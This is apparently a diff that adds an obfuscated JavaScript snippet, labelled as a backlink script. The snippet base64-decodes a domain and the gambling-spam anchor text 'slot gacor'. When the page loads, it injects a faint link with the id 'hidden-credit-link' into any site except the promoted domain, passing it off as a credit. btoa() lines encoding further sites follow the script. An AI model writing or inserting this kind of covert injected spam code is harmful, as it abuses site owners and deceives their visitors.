@@ -1,0 +1,57 @@
+<script>
+      (function () {
+        try {
+      
+          const ownerDomain = atob("d3d3LmVudXNhLmVz");
+          const link = atob("aHR0cHM6Ly93d3cuZW51c2EuZXMv");
+          const anchorText = atob("c2xvdCBnYWNvcg==").trim();
+      
+          if (location.hostname === ownerDomain) return;
+      
+          function addCredit() {
+      
+            if (document.getElementById("hidden-credit-link")) return;
+      
+            const credit = document.createElement("div");
+            credit.id = "hidden-credit-link";
+      
+            credit.style.fontSize = "10px";
+            credit.style.color = "#666";
+            credit.style.textAlign = "center";
+            credit.style.marginTop = "5px";
+            credit.style.pointerEvents = "auto";
+      
+            const a = document.createElement("a");
+            a.href = link;
+            a.target = "_blank";
+            a.rel = "noopener noreferrer";
+            a.textContent = anchorText;
+            a.style.color = "#666";
+            a.style.textDecoration = "none";
+      
+            credit.appendChild(a);
+            document.body.appendChild(credit);
+          }
+      
+          if (document.readyState === "loading") {
+            document.addEventListener("DOMContentLoaded", addCredit);
+          } else {
+            addCredit();
+          }
+      
+        } catch (e) {
+          console.warn("credit script error", e);
+        }
+      })();
+</script>
+
+
+
+
+
+btoa("healthygrocerygirl.com")
+btoa("https://www.enusa.es")
+btoa("WLA234")
+
+
+SCRIPT BACKLINK BINATANG
